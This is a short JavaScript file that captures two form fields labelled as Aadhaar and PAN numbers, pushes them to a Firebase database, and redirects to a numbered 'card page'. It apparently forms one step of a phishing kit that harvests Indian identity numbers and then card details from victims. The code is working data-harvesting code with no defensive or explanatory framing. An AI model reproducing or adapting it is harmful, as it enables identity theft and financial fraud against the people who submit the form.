
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var a1 = getElementVal("a1");
    var b2 = getElementVal("b2");
    
    
    

  

  saveMessages(a1, b2);

  // redirect to card page
  window.location.href = "4.html";
}

const saveMessages = (a1, b2) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      aadhar: a1,
      pan: b2,
     
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

